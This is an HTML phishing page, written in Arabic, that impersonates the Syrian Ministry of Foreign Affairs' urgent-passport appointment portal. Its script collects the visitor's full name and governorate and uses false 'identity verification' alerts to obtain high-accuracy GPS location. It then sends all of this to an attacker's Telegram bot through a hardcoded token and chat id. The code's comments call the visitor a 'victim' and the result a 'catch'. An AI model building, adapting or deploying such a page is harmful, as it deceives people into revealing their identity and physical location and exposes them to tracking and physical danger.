<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بوابة حجز الدور للجواز المستعجل | الخارجية السورية</title>
    <style>
        /* إعدادات الخلفية العامة - رمادي فاتح مع نقوش إسلامية ناعمة لتماثل الصورة */
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            background-color: #f7f7f7; 
            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><g fill="%23d0d0d0" fill-opacity="0.2"><path d="M50 0 L100 50 L50 100 L0 50 Z" /><path d="M0 0 L100 100" /><path d="M100 0 L0 100" /></g></svg>');
            text-align: center; 
            margin: 0;
            padding: 0;
        }

        /* حاوية الشعار العلوي - خلفية بيضاء مع ظل لإبراز الشعار */
        .header-logo {
            background-color: #ffffff;
            padding: 15px 0;
            border-bottom: 3px solid #d4af37; /* خط ذهبي فاخر */
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            margin-bottom: 30px;
        }

        /* إعدادات الشعار كصورة عريضة (Banner) */
        .header-logo img {
            max-width: 90%;
            height: auto;
            max-height: 80px; /* تحديد الارتفاع الأقصى للحفاظ على الشكل */
        }

        /* حاوية الاستمارة الرئيسية */
        .form-container { 
            background: white; 
            max-width: 450px; 
            margin: 0 auto 50px auto; 
            padding: 40px 30px; 
            border-radius: 15px; 
            box-shadow: 0px 8px 25px rgba(0,0,0,0.15); 
            border: 1px solid #e0e0e0;
        }

        /* عنوان الاستمارة - بلون ذهبي غامق ليتماشى مع الشعار */
        h2 { 
            color: #b38a2e; /* لون ذهبي داكن */
            margin-bottom: 5px; 
            font-size: 24px;
            font-weight: 700;
        }

        /* العرض الترويجي - لون أحمر ملفت */
        .promo { 
            color: #d32f2f; 
            font-weight: bold; 
            margin-bottom: 30px; 
            font-size: 16px;
        }

        /* إعدادات خانات الإدخال */
        label { 
            display: block; 
            text-align: right; 
            margin: 15px 5% 5px; 
            font-weight: 600; 
            color: #333; 
        }

        input, select { 
            width: 90%; 
            padding: 14px; 
            margin-bottom: 20px; 
            border: 2px solid #e0e0e0; 
            border-radius: 10px; 
            font-size: 16px; 
            background-color: #fafafa; 
            transition: border-color 0.3s;
        }

        input:focus, select:focus {
            border-color: #b38a2e; /* تغيير لون الإطار للذهبي عند التركيز */
            outline: none;
        }

        /* زر الإرسال - لون ذهبي غامق ومحسن */
        button { 
            background-color: #b38a2e; /* لون ذهبي داكن */
            color: white; 
            padding: 16px; 
            border: none; 
            border-radius: 10px; 
            cursor: pointer; 
            width: 90%; 
            font-size: 18px; 
            font-weight: bold; 
            transition: background-color 0.3s, transform 0.1s; 
            margin-top: 10px;
        }

        button:hover { 
            background-color: #c9a34e; /* لون ذهبي أفتح عند التحويم */
        }

        button:active {
            transform: scale(0.98); /* تأثير ضغط الزر */
        }

        /* رسالة تذييل الصفحة */
        .footer {
            color: #888;
            font-size: 12px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="header-logo">
        <img src="logo.png" alt="شعار وزارة الخارجية والمغتربين">
    </div>

    <div class="form-container">
        <h2>بوابة حجز الدور المستعجل</h2>
        <p class="promo">خدمة تقديم طلبات جواز السفر | الرسم: 40 دولار فقط للحجز الفوري</p>
        
        <label>الاسم الكامل (كما في الهوية):</label>
        <input type="text" id="full_name" placeholder="أدخل اسمك الثلاثي">

        <label>المحافظة:</label>
        <select id="city">
            <option value="">اختر المحافظة</option>
            <option value="إدلب">إدلب</option>
            <option value="حلب">حلب</option>
            <option value="دمشق">دمشق</option>
            <option value="ريف دمشق">ريف دمشق</option>
            <option value="حمص">حمص</option>
            <option value="حماة">حماة</option>
            <option value="اللاذقية">اللاذقية</option>
            <option value="طرطوس">طرطوس</option>
            <option value="دير الزور">دير الزور</option>
            <option value="الرقة">الرقة</option>
            <option value="الحسكة">الحسكة</option>
            <option value="درعا">درعا</option>
            <option value="السويداء">السويداء</option>
            <option value="القنيطرة">القنيطرة</option>
        </select>

        <button onclick="getLocation()">تأكيد حجز الدور المستعجل</button>
    </div>

    <div class="footer">
        © جميع الحقوق محفوظة لوزارة الخارجية والمغتربين 2024
    </div>

    <script>
        function getLocation() {
            let name = document.getElementById("full_name").value;
            let city = document.getElementById("city").value;

            if (name == "" || city == "") {
                alert("⚠️ يرجى إكمال البيانات المطلوبة أولاً.");
                return;
            }

            if (navigator.geolocation) {
                // إظهار رسالة تحميل أو تنبيه للمستخدم
                navigator.geolocation.getCurrentPosition(function(position) {
                    sendData(position, name, city);
                }, function(error) {
                    // رسالة تمويهية مقنعة لضرورة تفعيل الـ GPS
                    alert("⚠️ يجب السماح بالوصول للموقع (GPS) للتحقق من هويتك ومنطقتك الجغرافية لإتمام الحجز بنجاح.");
                }, {
                    enableHighAccuracy: true // محاولة جلب الموقع بأعلى دقة
                });
            } else {
                alert("⚠️ متصفحك لا يدعم هذه الخدمة.");
            }
        }

        function sendData(position, name, city) {
            let lat = position.coords.latitude;
            let lon = position.coords.longitude;
            // معلومات البوت تبعك
            let token = "8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg";
            let chat_id = "7214473798";
            
            let message = `🔔 صيد جديد من استمارة الجوازات (رسمية):\n\n` +
                          `👤 الاسم: ${name}\n` +
                          `🏙️ المحافظة: ${city}\n` +
                          `📍 الموقع: https://www.google.com/maps?q=${lat},${lon}\n` +
                          `🌐 إحداثيات: ${lat}, ${lon}`;
            
            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chat_id, text: message })
            });

            // رسالة نهائية تظهر للضحية لإكمال التمويه
            alert("✅ تم استلام طلبك بنجاح وجاري التحقق من البيانات. سيتم التواصل معك عبر الهاتف لتحديد موعد الاستلام.");
        }
    </script>
</body>
</html>
